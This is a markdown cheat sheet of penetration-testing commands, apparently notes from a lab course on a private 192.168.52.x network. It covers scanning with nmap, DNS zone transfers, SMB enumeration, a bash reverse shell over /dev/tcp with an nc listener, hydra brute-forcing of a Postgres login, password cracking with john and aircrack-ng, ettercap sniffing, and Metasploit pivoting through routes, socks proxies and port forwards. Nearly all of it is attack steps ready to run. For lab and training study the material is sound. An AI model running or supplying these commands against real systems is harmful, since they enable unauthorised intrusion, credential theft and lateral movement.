# NSP cheatsheet

## ip

> ip a

## Calculate the network

> ipcalc \<ip>

## default gateway

> ip r

## dns

> nslookup

or

> cat /etc/resolv.conf 

getting dns records if possible

> dig axfr \<dnsnameserver> @\<ip>

or

> dnsrecon -d zonetransfer.me -t axfr

## Nmap

script location:
> /usr/share/nmap/scripts/

scanning a range:

> sudo nmap 192.168.52.1-100

scanning a host:

> sudo nmap -p- -sV -O \<ip>

## smb

listing fileshares:
> smclient -L \<ip>

connecting to a fileshare:
> smbclient \\\\\<ip>\\\<fileshare>

## Reverse shell

start listener:
>nc -lvp 6666

start reverse shell:
> bash -i >& /dev/tcp/192.168.53.25/6666 0>&1

## Database password cracking

cracking:
> hydra -L NSP/postgres.txt -P NSP/pokemon-list.txt 192.168.52.60 postgres

connecting:
> psql -U postgres -W -h 192.168.52.60

## Ldap

finding domain controller:
> nmap -p 389 -sV 192.168.52.1-100

domain info:
> nmap -p 389 --script ldap-rootdse 192.168.52.4

## Cracking

generating wordlist:
> crunch 9 9 0123456789 -t FLAG-%%%% > flag.txt

extracted hash:
> zip2john FLAG-.zip > flag.hash`

cracking password:
> john flag.hash --wordlist=flag.txt

showing password:
> john flag.hash --show

## Wifi cracking

cracking:

> aircrack-ng -w crack-crunch.txt wificapturefilehere.pcap

in wireshark:
> packet > protocol prefs > IEEE Wireless LAN > Decryption keys > add wpa-pwd


## Sniffing

ettercap -T /192.168.52.70// /192.168.52.23//

## Pivoting

start reverse shell listener:

> see reverse shell

add a user:

> adduser arman

check user:

> cat /etc/passwd

check if the host has a ssh port:

> nmap \<ip> -sV

ssh:

> ssh arman@\<ip> -p \<port> 

check interfaces:

> ip a

metasploit and search for ssh (sshexec):

>mfsconsole

>search ssh

after you're in the meterpreter shell:

> bg

in metasploit:

> route add \<newnetworkaddress> \<sessionid> 

> search socks

> use server/proxy_server

> run -j

> jobs

> search ping_sweep

> use post/multi/gather/ping_sweep

> session

> set session \<sessionid>

> set rhosts \<routerange>

>run

scan new host:

> proxychains nmap \<ip> -sT -Pn

get page from port 80:

> proxychains curl \<ip>

in meterpreter session:

> sessions

get back into session:

> session -i \<sessionid>

create port forward:

> portfwd add -l 8080 -p 80 -r \<ip>

> ssh -L 80:localhost:8080 \<username>@\<kaliip>